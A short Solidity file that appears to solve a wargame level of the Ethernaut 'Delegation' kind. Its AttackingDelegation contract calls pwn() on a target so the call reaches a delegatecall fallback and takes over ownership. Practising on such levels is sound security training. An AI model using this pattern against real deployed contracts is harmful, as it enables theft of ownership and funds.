// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
interface IDelegate {
    function pwn() external;
}
contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        IDelegate(contractAddress).pwn();
    }
}
